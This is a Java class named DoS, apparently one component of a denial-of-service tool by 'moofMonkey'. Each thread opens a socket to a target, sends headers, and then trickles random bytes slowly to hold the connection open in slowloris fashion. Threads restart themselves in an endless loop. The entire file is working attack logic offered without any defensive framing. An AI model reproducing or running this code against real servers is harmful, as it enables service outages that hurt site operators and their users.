package com.moofMonkey;

import java.net.Socket;
import java.util.Random;

/**
 * @author moofMonkey
 */
public class DoS extends Thread {
	/**
	 * Random variable
	 */
	private static final Random rnd = new Random();
	/**
	 * Counter variable
	 */
	private static int c = -1;
	
	/**
	 * Runs thread
	 */
	@Override
	public void run() {
		setName("" + ++c);
		System.out.println("[DoS] Thread #" + getName() + " started!");
		try {
			int rand = Math.abs(rnd.nextInt());
			Socket s = Main.newSocket();
			if(s == null) {
				restart();
				return;
			}
			Writer w = new Writer(s.getOutputStream());
			
			
			for(int i = 0; i < Main.headers.length; i++)
				w.writeLine(Main.headers[i] + (Main.headers.length-1==i?rand:""));
			w.writeLine("");
			w.writeLine("");
			for(int i = 0; i < rand; i++) {
				w.write((char) (rnd.nextInt(255)) + "");
				Thread.sleep(250);
			}
			
			s.close();
			restart();
		} catch(Throwable t) {
			t.printStackTrace();
			restart();
		}
	}
	
	/**
	 * Stops this thread and creates new
	 */
	private void restart() {
		try {
			new DoS().start();
			interrupt();
		} catch(OutOfMemoryError t) {
			System.out.println("Out of memory!");
			System.exit(-5);
		}
	}
}
